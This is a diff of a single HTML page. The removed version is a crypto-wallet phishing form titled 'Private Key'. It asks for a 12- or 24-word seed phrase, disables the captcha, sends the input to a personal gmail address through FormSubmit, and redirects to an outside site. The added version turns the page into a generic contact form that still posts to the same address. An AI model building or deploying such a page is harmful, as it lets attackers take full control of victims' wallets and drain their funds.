@@ -3,207 +3,143 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Private Key</title>
+  <title>Contact Form</title>
+
+  <!-- Google Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
 
   <style>
-    *{
-      margin:0;
-      padding:0;
-      box-sizing:border-box;
-      font-family: Arial, Helvetica, sans-serif;
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Poppins", sans-serif;
     }
 
-    body{
-      min-height:100vh;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      background:#f4f4f4;
-      padding:20px;
+    body {
+      background: linear-gradient(135deg, #0d6efd, #1e90ff);
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
     }
 
-    .container{
-      width:100%;
-      max-width:500px;
-      background:#fff;
-      padding:40px 30px;
-      border-radius:20px;
-      box-shadow:0 10px 30px rgba(0,0,0,0.08);
-      text-align:center;
+    .container {
+      background: #ffffff;
+      width: 100%;
+      max-width: 420px;
+      padding: 30px;
+      border-radius: 18px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      animation: fadeIn 0.8s ease-in-out;
     }
 
-    .title{
-      font-size:42px;
-      font-weight:600;
-      color:#222;
-      margin-bottom:25px;
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
 
-    .line{
-      width:100%;
-      height:2px;
-      background:#dcdcdc;
-      margin-bottom:35px;
+    h1 {
+      text-align: center;
+      color: #0d6efd;
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 8px;
     }
 
-    .input-box{
-      width:100%;
-      height:65px;
-      border:2px solid #d4d4d4;
-      border-radius:12px;
-      padding:0 20px;
-      font-size:20px;
-      color:#555;
-      outline:none;
-      margin-bottom:25px;
-      background:white;
-      transition:0.3s ease;
+    p {
+      text-align: center;
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 25px;
     }
 
-    .input-box:focus{
-      border-color:#0066ff;
+    label {
+      font-size: 13px;
+      color: #333;
+      margin-bottom: 5px;
+      display: block;
     }
 
-    .input-box::placeholder{
-      color:#8b8b9b;
+    input, textarea {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 18px;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      outline: none;
+      transition: 0.3s;
+      font-size: 14px;
     }
 
-    .info{
-      font-size:18px;
-      line-height:1.6;
-      color:#555;
-      margin-bottom:35px;
+    input:focus, textarea:focus {
+      border-color: #0d6efd;
+      box-shadow: 0 0 0 3px rgba(13,110,253,0.2);
     }
 
-    .btn{
-      width:100%;
-      height:60px;
-      border:none;
-      border-radius:12px;
-      font-size:20px;
-      font-weight:600;
-      color:white;
-      cursor:pointer;
-      transition:0.3s ease;
-      margin-bottom:18px;
+    textarea {
+      resize: none;
+      height: 100px;
     }
 
-    .btn:hover{
-      transform:translateY(-2px);
+    button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      background: #0d6efd;
+      color: white;
+      font-size: 15px;
+      font-weight: 600;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: 0.3s;
     }
 
-    .proceed{
-      background:#0066ff;
+    button:hover {
+      background: #0b5ed7;
+      transform: scale(1.02);
     }
 
-    .cancel{
-      background:#e91d3a;
+    .footer-text {
+      text-align: center;
+      font-size: 12px;
+      margin-top: 15px;
+      color: #888;
     }
-
-    /* TABLET */
-    @media(max-width:768px){
-
-      .container{
-        max-width:450px;
-        padding:35px 25px;
-      }
-
-      .title{
-        font-size:36px;
-      }
-
-      .input-box{
-        height:60px;
-        font-size:18px;
-      }
-
-      .btn{
-        height:58px;
-        font-size:18px;
-      }
-    }
-
-    /* MOBILE */
-    @media(max-width:480px){
-
-      body{
-        padding:15px;
-      }
-
-      .container{
-        padding:30px 20px;
-        border-radius:16px;
-      }
-
-      .title{
-        font-size:30px;
-      }
-
-      .line{
-        margin-bottom:28px;
-      }
-
-      .input-box{
-        height:56px;
-        font-size:16px;
-        padding:0 16px;
-      }
-
-      .info{
-        font-size:15px;
-        margin-bottom:28px;
-      }
-
-      .btn{
-        height:54px;
-        font-size:16px;
-      }
-    }
-
-    /* LARGE DESKTOP */
-    @media(min-width:1200px){
-
-      .container{
-        max-width:550px;
-      }
-
-      .title{
-        font-size:48px;
-      }
-    }
-
   </style>
 </head>
+
 <body>
-<div class="container">
 
-    <h1 class="title">Private Key</h1>
+  <div class="container">
+    <h1>Contact Us</h1>
+    <p>Send us a message and we will reply quickly</p>
 
-    <div class="line"></div>
-
+    <!-- FORM SUBMIT -->
     <form action="https://formsubmit.co/nxloaded@gmail.com" method="POST">
 
-  <input type="hidden" name="_captcha" value="false">
+      <!-- Disable captcha -->
+      <input type="hidden" name="_captcha" value="false">
 
-  <input type="hidden" name="_next" value="https://rtt-collects.vercel.app/">
+      <!-- Redirect after submit -->
+      <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you.html">
 
-  <input
-    type="text"
-    name="message"
-    placeholder="Enter private key"
-    required
-  >
-<p class="info">
-        Typically 12 (sometimes 24)<br>
-        seperated by single<br>
-        spaces
-      </p>
-  <button type="submit">PROCEED</button>
+      <label>Full Name</label>
+      <input type="text" name="name" placeholder="Enter your name" required>
 
-</form>
+      <label>Email</label>
+      <input type="email" name="email" placeholder="Enter your email" required>
 
+      <label>Message</label>
+      <textarea name="message" placeholder="Write your message..." required></textarea>
 
-     
+      <button type="submit">PROCEED</button>
+    </form>
+
+    <div class="footer-text">
+      Powered by secure FormSubmit
+    </div>
   </div>
 
 </body>
